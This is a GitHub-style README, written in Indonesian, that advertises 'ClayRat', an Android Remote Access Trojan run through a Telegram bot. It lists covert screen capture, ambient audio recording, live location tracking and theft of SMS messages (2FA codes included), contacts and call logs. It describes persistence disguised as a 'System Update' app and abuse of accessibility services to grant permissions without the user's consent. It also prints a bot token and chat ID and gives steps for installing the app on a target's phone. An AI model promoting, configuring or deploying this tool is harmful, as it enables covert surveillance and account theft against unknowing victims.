# 🔥 ClayRat Advanced Surveillance Suite v1.0

[![Version](https://img.shields.io/badge/Version-1.0-red)](https://github.com/mzkyzak/clayrat)
[![Platform](https://img.shields.io/badge/Platform-Android_14--16-brightgreen)](https://github.com/mzkyzak/clayrat)
[![C2](https://img.shields.io/badge/C2-Telegram_Bot-0088cc)](https://github.com/mzkyzak/clayrat)
[![Developer](https://img.shields.io/badge/Developer-mzkyzak-black)](https://github.com/mzkyzak/clayrat)

**ClayRat** adalah **Remote Access Trojan (RAT)** profesional untuk platform Android, dirancang untuk **surveillance** dan **remote command execution**. Mendukung Android 14 hingga 16 (termasuk HyperOS 3) dengan kontrol C2 melalui Telegram Bot API.

---

## ⚡ **FITUR UTAMA**

### 👁️ **Visual Spy (Intip Layar)**
| Komponen | Keterangan |
|----------|------------|
| **Vektor** | MediaProjection API + VirtualDisplay |
| **Tradecraft** | Loop retry 10x untuk tangkapan layar di refresh-rate tinggi |
| **Otomatisasi** | Bypass dialog "Mulai sekarang" via AccessibilityService Auto-Clicker |

### 🎙️ **Sadap Suara (Ambient Recording)**
| Komponen | Keterangan |
|----------|------------|
| **Vektor** | MediaRecorder (AudioSource.MIC) |
| **Background** | Berjalan di background via Handler (tetap jalan meski app ditutup) |
| **Format** | File `.amr` (kompresi tinggi, pengiriman cepat) |

### 📍 **Pelacakan Lokasi (Real-time)**
| Komponen | Keterangan |
|----------|------------|
| **Vektor** | FusedLocationProviderClient |
| **Fitur** | Koordinat GPS presisi tinggi + link Google Maps langsung ke bot |

### 📂 **Panen Data (Exfiltration)**
| Data | Sumber |
|------|--------|
| **SMS** | Seluruh inbox (termasuk OTP/2FA) |
| **Kontak** | Nama & nomor telepon |
| **Log Panggilan** | Riwayat masuk, keluar, tidak terjawab |

### 📱 **Fingerprinting Perangkat**
| Data | Sumber |
|------|--------|
| **Device Info** | Model, Brand, Android Version, API Level |
| **Battery** | Kapasitas (%) |
| **Storage** | Total & available space |
| **Root** | Deteksi status rooted |

---

## 🛠️ **INFRASTRUKTUR & KONFIGURASI**

### 📡 **Pengaturan Telegram C2**
| Parameter | Nilai |
|-----------|-------|
| **Bot Token** | `8898141962:AAHK5OWEo5UFNWGszehi97U8ZQSdPSyXEns` |
| **Chat ID Master** | `6945113481` |

### 🔄 **Mekanisme Persistensi**
| Komponen | Fungsi |
|----------|--------|
| **BootReceiver** | Auto-start setelah reboot HP |
| **Foreground Service** | Menyamar sebagai "System Update" — bypass baterai |
| **Accessibility Service** | "Mata-mata" utama — handle UI & izin otomatis |

---

## 🧭 **PANDUAN OPERASIONAL**

```bash
1. Instalasi
   # Pasang APK di target
   # Buka aplikasi "System Update Center"

2. Aktivasi
   # Chat ID otomatis terisi (6945113481)
   # Klik "Check for Updates"

3. Eskalasi Izin
   # Aktifkan "Support Services" di Accessibility Settings

4. Eksekusi
   # Gunakan tombol dashboard untuk trigger modul tertentu
